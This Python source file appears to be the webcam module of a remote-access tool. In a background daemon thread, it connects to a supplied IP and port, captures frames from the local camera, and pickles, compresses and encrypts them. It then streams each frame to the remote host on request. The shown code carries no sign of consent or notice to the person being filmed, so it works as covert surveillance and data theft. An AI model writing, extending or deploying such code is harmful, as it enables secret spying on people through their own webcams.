import threading
import socket
import pickle
import zlib
import time
import cv2

from foreign.parse.crash_exception_handling import *
from foreign.global_state import *


@crash_exception_handling
def cam_action(ip, port, monitor, fps):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))

  headersize = state['settings']['headersize']
  encryption = state['settings']['encryption']
  encoding = state['settings']['encoding']
  mode = [True, 0, b'']

  cam = cv2.VideoCapture(monitor)

  while True:
    last_time = time.time()
    client_msg = s.recv(81920)

    if mode[0]:
      mode[1] = int(client_msg[:headersize])
      mode[0] = False

    mode[2] += client_msg

    if len(mode[2])-headersize == mode[1]:
      check, frame = cam.read()

      if not check:
        cam.release()
        raise Exception('No cam')

      if fps:
        cv2.putText(frame, f'{1.0 / (time.time() - last_time):.2f}', (10, 25), cv2.FONT_HERSHEY_SIMPLEX, 0.8, (0, 0, 0), 2)

      frame = pickle.dumps(frame)
      frame = zlib.compress(frame, 9)
      frame = encryption.do_encrypt(frame)

      final_msg = bytes(f'{len(frame):<{headersize}}', encoding) + frame
      s.send(final_msg)

      mode = [True, 0, b'']


def cam(ip, port, monitor, fps):
  threading.Thread(target=cam_action, args=(ip, port, monitor, fps), daemon=True).start()
  return {'message': 'Cam thread started', 'text_mode': 'primary', 'text_extras': {'point': True}}